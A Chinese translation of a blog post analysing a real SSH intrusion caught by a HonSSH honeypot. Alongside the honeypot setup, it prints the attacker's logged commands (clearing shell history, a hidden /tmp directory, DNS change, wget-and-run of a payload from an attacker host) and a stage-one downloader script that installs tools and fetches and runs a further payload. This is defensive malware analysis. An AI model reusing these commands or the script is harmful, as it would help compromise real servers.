@@ -1,0 +1,441 @@
+# 【技术分享】解剖一次真正的 Linux 入侵（第一部分）︰ 运行SSH MiTM 蜜罐
+
+阅读量 **164547**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2016-09-22 16:59:16
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章来源：安全客
+
+原文地址：<http://blog.angelalonso.es/2016/09/anatomy-of-real-linux-intrusion-part-i.html>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+在接下来的文章中，我将会描写我最近一直在研究的、十分有趣的Linux攻击和入侵。我将会分享一些我已经分析过的工具，其中包括几个木马工具、扫描工具、root工具包等。
+
+我已经运行了一段时间的Linux蜜罐。大概7年前，我使用过内核级别的[Sebek](https://projects.honeynet.org/sebek/)
+进行系统调用。基于这项[研究](https://www.dcu.ie/registry/module_contents.php?function=4&programme=MSSF)，我在柏林城市大学为安全和法医博士们做过[一次展示](http://www.angelalonso.es/doc-presentaciones/Rootkit&honeypot-aalonso-DCU-Dec09.pdf)。
+
+几年前，我开始在不同ISP供应商和国家内的几个树莓Pi运行[Kippo](https://github.com/desaster/kippo)蜜罐。
+
+最近，我将其中几个蜜罐转移到了一个新的树莓Pi3B模型中。这个新的树莓拥有非常酷的 wifi
+无线集成网络。我没有继续使用Kippo，而是安装了它的一个分支[honssh](https://github.com/tnich/honssh)，它允许运行SSH
+MiTM。这个高交互蜜罐安装程序的主要优点就是允许攻击者访问真正的系统。
+
+**安装程序如下：**
+
+* * *
+
+**·** 运行Raspbian的两个树莓Pi:带有Wifi和Eth0的树莓Pi 3 ，和只带有eth0的树莓Pi 2
+
+**·** 将树莓Pi 3 通过WiFi 与路由器相连。
+
+**·** 将树莓Pi 3的eth0 接口连接到树莓Pi 2的eth0。在此设置中，通过树莓Pi 2的流量就一定会通过树莓Pi 3了。
+
+**·** 在树莓Pi 3中安装合适的NAT和防火墙。
+
+**·** 将NAT接入连接到树莓Pi 3路由器上的22接口。
+
+**·** 执行SSH MiTM的HonSSH在树莓Pi3上运行。任何传入的 SSH 连接都会重定向到运行真正 Debian 系统的树莓 2。
+
+在树莓 Pi 3 主机上，我运行了 iptables 来控制流量。基本上流量都来自树莓 Pi 2，也就是即将被入侵的地方，我只接受传出 HTTP，NTP 和
+DNS 和传入 SSH，其余的都会被阻止。
+
+iptables 脚本如下︰  
+
+    
+    
+    #!/bin/sh
+    /sbin/iptables -F
+    /sbin/iptables -F -t nat
+    /sbin/iptables --policy INPUT DROP
+    /sbin/iptables --policy OUTPUT ACCEPT
+    /sbin/iptables --policy FORWARD DROP
+     
+    /sbin/iptables -A INPUT  -i wlan0 -p 6 --dport 22222 -j ACCEPT
+    /sbin/iptables -A INPUT  -i wlan0 -p 6 --dport 2222 -j ACCEPT
+     
+    /sbin/iptables -A INPUT -i wlan0  -p tcp --dport ftp -j ACCEPT
+    /sbin/iptables -A INPUT -i wlan0   -p tcp --dport ftp-data -j ACCEPT
+    /sbin/iptables -A INPUT -p ALL -i wlan0 -m state --state  ESTABLISHED,RELATED -j ACCEPT
+    /sbin/iptables -A INPUT -p ALL -i eth0 -m state --state  ESTABLISHED,RELATED -j ACCEPT
+    /sbin/iptables -A INPUT -p icmp -i wlan0  -j ACCEPT
+     
+    /sbin/iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
+    /sbin/iptables -A INPUT  -i eth0  -j DROP 
+     
+    /sbin/iptables -A FORWARD -p ALL -m state --state  ESTABLISHED,RELATED -j ACCEPT
+    /sbin/iptables -A FORWARD  -p tcp --dport 80 -j ACCEPT
+    /sbin/iptables -A FORWARD  -p udp --dport 53 -j ACCEPT
+    /sbin/iptables -A FORWARD  -p tcp --dport 53 -j ACCEPT
+    /sbin/iptables -A FORWARD   -p tcp  --dport 123 -j ACCEPT
+    /sbin/iptables -A FORWARD   -p udp  --dport 123 -j ACCEPT
+     
+    /sbin/iptables -A FORWARD   --dst 192.168.1.0/24  -j DROP
+    /sbin/iptables -A INPUT -i eth0   --dst 192.168.1.0/24  -j DROP
+    /sbin/iptables -A FORWARD  -p icmp -j ACCEPT
+
+在Honssh Wiki
+的网址<https://github.com/tnich/honssh/wiki>中，你可以找到一些用于设置的文件。我还做了一些额外的事情：
+
+**·** 在树莓Pi2中创建了几个易于蛮力攻击的账号。
+
+**·** 将树莓Pi2中来自SSHD的密钥复制到HonSSH，因此这两套密钥是相通的。这使得通过SSH指纹发现MiTM SSH变得更加困难。
+
+**·** Raspbian 8中的默认openssh服务器是6.7，此版本不支持SSH 遗留协议。我手动添加了所需协议，以保证可以兼容一些攻击。因此，我在
+/etc/ssh/sshd_config中加入了这个：
+
+**·**
+
+    
+    
+    curve25519-sha256@libssh.org,ecdh-sha2-nistp256,ecdh-sha2-nistp384,ecdh-sha2-nistp521,diffie-hellman-group-exchange-sha256,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1
+
+**·** HonSSH中改进的网络技术足以骗过攻击者。
+
+HonSSH存在一个小漏洞，导致 HonSSH 进程会时不时的崩溃。我创建了一个 cron 脚本，每 5
+分钟运行一次来检查该进程是否在运行，如果没有就重新启动该进程。
+
+该脚本如下：
+
+    
+    
+    #!/bin/bash
+    process=`ps auxw | grep  /usr/bin/twistd | grep -v grep | awk '{print $2}'`if [ $process > 1 ]then echo $process else cd /home/admin/honssh-master/
+     ./honsshctrl.sh stop; rm honssh.pid; ./honsshctrl.sh stop;  ./honsshctrl.sh start &
+    fi
+
+有趣的事情就要开始了。
+
+现在有很多针对蜜罐的攻击手段： SSH 扫描、 用户和密码蛮力攻击、在遭到损害的系统中安装扫描工具、 安装 IRC
+保镖等。这一系列攻击正在各个国家发生着。但是现在我的重点不是数据分析，而是这些网络罪犯们使用的工具。我将会描写一些我已经分析过的有趣的恶意工具。
+
+重要提示：在我写下这篇文章的时候，存在不同URL中的这些恶意工具仍旧是活跃状态。网络罪犯们也依旧在使用着这些工具进行自己的恶意活动，所以我决定将这一切公之于众，为安全研究尽一份力。
+
+  
+
+**自动扫描和蛮力攻击**
+
+* * *
+
+这种攻击的第一步就是通过暴力破解来获得访问权限。
+
+蛮力的IP来源通常是已经被入侵的主机，通过自动工具来获取大范围的IP。在真正入侵发生之前，会遭到蛮力攻击的IP列表如下：
+
+    
+    
+    116.96.24.144
+    158.69.84.195
+    171.234.230.47
+    185.110.132.201
+    193.169.53.171
+    194.203.215.254
+    195.154.45.84
+    203.113.167.163
+    217.243.198.134
+    42.114.236.217
+    91.224.160.106
+
+使用有效凭据手动进入受损主机
+
+* * *
+
+一旦网络罪犯从上一步中获取了有效凭据，他们就会手动登陆，但是这次的登陆是在一个不同的IP地址。在下面这种情况下，使用的IP地址是5.189.136.43。
+
+    
+    
+    016-09-04 10:26:43+0200 [honssh.server.HonsshServerFactory] [PLUGIN][HONEYPOT-STATIC] - GET_PRE_AUTH_DETAILS
+    2016-09-04 10:26:43+0200 [-] [PRE_AUTH] - Connecting to Honeypot: normando (192.168.16.2:22)
+    2016-09-04 10:26:43+0200 [-] [ADV-NET] - HonSSH Interface already exists, not re-adding
+    2016-09-04 10:26:43+0200 [-] [ADV-NET] - HonSSH FakeIP and iptables rules added
+    2016-09-04 10:26:43+0200 [-] Starting factory <honssh.client.HonsshClientFactory instance at 0x745ccaf8>
+    2016-09-04 10:26:43+0200 [Uninitialized] [CLIENT] - New client connection
+    2016-09-04 10:26:43+0200 [HonsshClientTransport,client] kex alg, key alg: diffie-hellman-group-exchange-sha1 ssh-rsa
+    2016-09-04 10:26:43+0200 [HonsshClientTransport,client] outgoing: aes256-ctr hmac-sha1 none
+    2016-09-04 10:26:43+0200 [HonsshClientTransport,client] incoming: aes256-ctr hmac-sha1 none
+    2016-09-04 10:26:44+0200 [HonsshClientTransport,client] REVERSE
+    2016-09-04 10:26:44+0200 [HonsshClientTransport,client] NEW KEYS
+    2016-09-04 10:26:44+0200 [HonsshClientTransport,client] [CLIENT] - Client Connection Secured
+    2016-09-04 10:26:44+0200 [HonsshServerTransport,76,5.189.136.43] kex alg, key alg: diffie-hellman-group1-sha1 ssh-rsa
+    2016-09-04 10:26:44+0200 [HonsshServerTransport,76,5.189.136.43] outgoing: aes256-ctr hmac-sha1 none
+    2016-09-04 10:26:44+0200 [HonsshServerTransport,76,5.189.136.43] incoming: aes256-ctr hmac-sha1 none
+    2016-09-04 10:26:44+0200 [-] [PLUGIN][OUTPUT-TXTLOG] - CONNECTION_MADE
+    2016-09-04 10:26:44+0200 [-] [PRE_AUTH] - CLIENT CONNECTED, REPLAYING BUFFERED PACKETS
+    2016-09-04 10:26:47+0200 [HonsshServerTransport,76,5.189.136.43] NEW KEYS
+    2016-09-04 10:26:49+0200 [HonsshClientTransport,client] [SSH] - Detected Public Key Auth - Disabling!
+    2016-09-04 10:26:51+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][HONEYPOT-STATIC] - GET_POST_AUTH_DETAILS
+    2016-09-04 10:26:51+0200 [-] [POST_AUTH] - SUCCESS = FALSE, NOT POST-AUTHING
+    2016-09-04 10:26:51+0200 [HonsshClientTransport,client] [PLUGIN][OUTPUT-TXTLOG] - LOGIN_SUCCESSFUL
+    2016-09-04 10:26:52+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - CHANNEL_OPENED
+    2016-09-04 10:26:57+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: unset HISTFILE
+    2016-09-04 10:26:57+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:27:21+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: uname -a
+    2016-09-04 10:27:21+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: export HISTFILE=/dev/null
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: sudo su -    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: export HISTFILE=/dev/null
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: mkdir /tmp/... ; cd /tmp/...
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: echo "nameserver 208.67.220.222" >> /etc/resolv.conf
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: wget http://gopremium.mooo.com/.../auto/p
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76, ] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: chmod +x p ;  ./p
+    2016-09-04 10:27:23+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:27:23+0200 [-] [PLUGIN][OUTPUT-TXTLOG] - DOWNLOAD_FINISHED
+    2016-09-04 10:27:35+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: admin
+    2016-09-04 10:27:35+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:27:46+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: cat /etc/issue
+    2016-09-04 10:27:46+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:27:54+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: ct /etc/passwd^[[1~a
+    2016-09-04 10:27:54+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:28:11+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: whoami
+    2016-09-04 10:28:11+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:28:39+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: last|more
+    2016-09-04 10:28:39+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:28:46+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: passwd
+    2016-09-04 10:28:46+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:28:48+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: admin
+    2016-09-04 10:28:48+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:29:01+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: modrepo
+    2016-09-04 10:29:01+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:29:04+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: modrepo
+    2016-09-04 10:29:04+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:29:09+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: modrepo1
+    2016-09-04 10:29:09+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:29:12+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: modrepo1
+    2016-09-04 10:29:12+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:29:21+0200 [HonsshServerTransport,76,5.189.136.43] [TERM] - Entered command: ifconfig
+    2016-09-04 10:29:21+0200 [HonsshServerTransport,76,5.189.136.43] [PLUGIN][OUTPUT-TXTLOG] - COMMAND_ENTERED
+    2016-09-04 10:33:58+0200 [HonsshServerTransport,76,5.189.136.43] Disconnecting with error, code 10
+            reason: user closed connection
+    2016-09-04 10:33:58+0200 [HonsshServerTransport,76,5.189.136.43] connection lost
+
+从上面的日志中我可以提取出一整套执行命令如下︰
+
+    
+    
+    unset HISTFILE   
+    uname -a
+    export HISTFILE=/dev/null
+    sudo su -    export HISTFILE=/dev/null
+    mkdir /tmp/... ; cd /tmp/...
+    echo "nameserver 208.67.220.222" >> /etc/resolv.conf
+    wget http://gopremium.mooo.com/.../auto/p 
+    chmod +x p ; ./p
+    admin
+    cat /etc/issue
+    ct /etc/passwda  
+    last|more
+    passwd  
+    admin
+    modrepo
+    modrepo
+    modrepo1
+    modrepo1
+    Ifconfig
+
+**这里有几个值得注意的地方：**
+
+**·** 攻击者们禁用了 HISTFILE，目的是不留下任何在.bash_history 执行命令的证据。此外他们还在 /tmp
+中创建了目录"……"来愚弄管理员。
+
+**·** 他们还尝试更改 DNS，可能是为了确保存储附加工具的主机可以被处理，但也可能是为了避免连接到内部的 DNS 服务器，这个服务器可以监测任何可疑的
+DNS 查询。
+
+**·** 他们采用了"cat /etc/passwda"命令，这意味着他们手动运行了该命令。
+
+**·** 最后，攻击者试图将默认密码'admin'更改为"modrepo"，但是没有成功，最后只好改为"modrepo1"。
+
+**·**
+文件“p”来自[http://gopremium.mooo.com/…/auto/p。](http://gopremium.mooo.com/.../auto/p%E3%80%82)
+
+**脚本1（p）：检查必要工具**
+
+* * *
+
+主要目的如下：
+
+**·** 尝试编译一段小的C脚本，来检查GCC编译器是否安装并可以正常运行。
+
+**·** 如果没有安装编译器，脚本会试图进行安装。根据Linux的版本不同，会使用yum, apt, yast,
+zipper来安装gcc。然后再尝试编译执行程序。
+
+  
+
+下面是第一个p脚本的内容：
+
+* * *
+    
+    
+    #!/bin/bash
+    ############## first installation part (p)
+    ############## verificam daca serverul are instalat ce ne trebuie
+    
+    # echo -e "33[0;31m [-] 33[0m33[0m" # red
+    # echo -e "33[0;32m [+] 33[0m33[0m" # green
+    # echo -e "33[0;36m xxx 33[0m33[0m" #cyan
+    echo
+    
+    export HISTFILE=/dev/null
+    export PATH=$PATH:/usr/local/sbin/
+    export PATH=$PATH:/usr/sbin/
+    export PATH=$PATH:/sbin
+    export PATH=$PATH:/bin
+    
+    
+    if [ "$(whoami)" != "root" ]; then
+            echo -e "33[0;31m [-] 33[0m33[0m you are not root" # red
+            echo; exit
+    fi
+    
+    ### verificam daca e instalat ce folosim
+    weneed="/usr/bin/gcc"
+    weinstall="gcc"
+    if [ -f $weneed ]; then
+            echo -e "33[0;32m [+] 33[0m33[0m $weinstall found" # green
+                    ### testam gcc (la unele servere lipsesc librarii)
+                    echo "#include <stdio.h>" > t.c
+                    echo "#include <pthread.h>" >> t.c
+                    echo "int main() {" >> t.c
+                    echo "sleep(1);" >> t.c
+                    echo "return 0;" >> t.c
+                    echo "}" >> t.c
+                    gcc -o t t.c 1>>/dev/null 2>>/dev/null
+                    if [ -f t ]; then
+                            echo -e "33[0;32m [+] 33[0m33[0m $weinstall test was successful" # green
+                            rm -rf t.c t
+                    else
+                            echo -e "33[0;31m [-] 33[0m33[0m $weinstall test failed. aborting. " # red
+                            echo "try to install libc6-dev: apt-get install -y libc6-dev"
+                            rm -rf t.c
+                            echo ; exit
+                    fi
+                    # EOF testam gcc (la unele servere lipsesc librarii)
+    else
+            echo -e "33[0;31m [-] 33[0m33[0m $weinstall missing - trying to install... " # red
+            if [ -f /usr/bin/yum ] ; then yum install -y $weinstall ; fi
+            if [ -f /usr/bin/apt-get ] ; then apt-get update ; apt-get install -y $weinstall ; fi
+            if [ -f /sbin/yast ] ; then yast -i $weinstall ; fi
+            if [ -f /usr/bin/zypper ] ; then zypper -n install $weinstall ; fi
+    
+            if [ -f $weneed ]; then
+                    echo ; echo -e "33[0;32m [+] 33[0m33[0m $weinstall installed." # green
+                    ### testam gcc (la unele servere lipsesc librarii)
+                    echo "#include <stdio.h>" > t.c
+                    echo "#include <pthread.h>" >> t.c
+                    echo "int main() {" >> t.c
+                    echo "sleep(1);" >> t.c
+                    echo "return 0;" >> t.c
+                    echo "}" >> t.c
+                    gcc -o t t.c 1>>/dev/null 2>>/dev/null
+                    if [ -f t ]; then
+                            echo -e "33[0;32m [+] 33[0m33[0m $weinstall test was successful" # green
+                            rm -rf t.c t
+                    else
+                            echo -e "33[0;31m [-] 33[0m33[0m $weinstall test failed. aborting. " # red
+                            echo "try to install libc6-dev: apt-get install -y libc6-dev"
+                            rm -rf t.c
+                            echo ; exit
+                    fi
+                    # EOF testam gcc (la unele servere lipsesc librarii)
+            else
+                    echo ; echo -e "33[0;31m [-] 33[0m33[0m $weinstall failed to install. aborting. " # red
+                    echo  ; exit
+            fi
+    fi
+    
+    weneed="/bin/sed"
+    weinstall="sed"
+    if [ -f $weneed ]; then
+            echo -e "33[0;32m [+] 33[0m33[0m $weinstall found" # green
+    else
+            echo -e "33[0;31m [-] 33[0m33[0m $weinstall missing - trying to install... " # red
+            if [ -f /usr/bin/yum ] ; then yum install -y $weinstall ; fi
+            if [ -f /usr/bin/apt-get ] ; then apt-get update ; apt-get install -y $weinstall ; fi
+            if [ -f /sbin/yast ] ; then yast -i $weinstall ; fi
+            if [ -f /usr/bin/zypper ] ; then zypper -n install $weinstall ; fi
+    
+            if [ -f $weneed ]; then
+                    echo ; echo -e "33[0;32m [+] 33[0m33[0m $weinstall installed." # green
+            else
+                    echo ; echo -e "33[0;31m [-] 33[0m33[0m $weinstall failed to install. aborting. " # red
+                    echo  ; exit
+            fi
+    fi
+    
+    weneed="/usr/bin/curl"
+    weinstall="curl"
+    if [ -f $weneed ]; then
+            echo -e "33[0;32m [+] 33[0m33[0m $weinstall found" # green
+    else
+            echo -e "33[0;31m [-] 33[0m33[0m $weinstall missing - trying to install... " # red
+            if [ -f /usr/bin/yum ] ; then yum install -y $weinstall ; fi
+            if [ -f /usr/bin/apt-get ] ; then apt-get update ; apt-get install -y $weinstall ; fi
+            if [ -f /sbin/yast ] ; then yast -i $weinstall ; fi
+            if [ -f /usr/bin/zypper ] ; then zypper -n install $weinstall ; fi
+    
+            if [ -f $weneed ]; then
+                    echo ; echo -e "33[0;32m [+] 33[0m33[0m $weinstall installed." # green
+            else
+                    echo ; echo -e "33[0;31m [-] 33[0m33[0m $weinstall failed to install. aborting. " # red
+                    echo  ; exit
+            fi
+    fi
+    # EOF  verificam daca e instalat ce folosim
+    
+    echo -e "33[0;32m [+] 33[0m33[0m downloading OS & RK detection (p1)" # green
+    rm -rf p1
+    curl --progress-bar -O http://gopremium.mooo.com/.../auto/p1
+    if [ ! -f p1 ] ; then echo -e "33[0;31m [-] 33[0m33[0m file missing - download failed. aborting" ; echo ; exit ; fi
+    chmod +x p1 ; ./p1
+
+分享一些有趣的观点：
+
+  * 此脚本的注释用的是罗马尼亚语，该入侵中其余所有的脚本和工具都用的是罗马尼亚语。看起来似乎这些攻击者都是罗马尼亚人，或者是他们使用工具的开发者是罗马尼亚人。 
+
+  * 已经有人调试过脚本，并报告了存在的问题（用彩色标出）。他们已经投入了相当多的时间来开发这些脚本和工具。这个脚本显示的是“下载OS&RK检测”。 
+
+** **下面是在实验主机中执行该脚本获得的输出：
+
+以上就是本文第一部分的内容，我会在文章的第二部分中分享第二个p脚本，并且对Linux入侵进行更深入的分析，所以尽请期待在《解剖一次真正的 Linux
+入侵（第二部分）》中更精彩的技术分享吧。
+
+  
+
+本文翻译自安全客 [原文链接](http://blog.angelalonso.es/2016/09/anatomy-of-real-linux-intrusion-part-i.html)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **默白** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/84611](/post/id/84611)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [安全客](http://blog.angelalonso.es/2016/09/anatomy-of-real-linux-intrusion-part-i.html)
+
+如若转载,请注明出处： <http://blog.angelalonso.es/2016/09/anatomy-of-real-linux-intrusion-part-i.html>
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [安全知识](/tag/安全知识)
+
+ **+1** __0赞
+
+ __收藏
+
+![](https://p5.ssl.qhmsg.com/dm/200_200_100/t011edf3404f95091e3.jpg) 默白
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
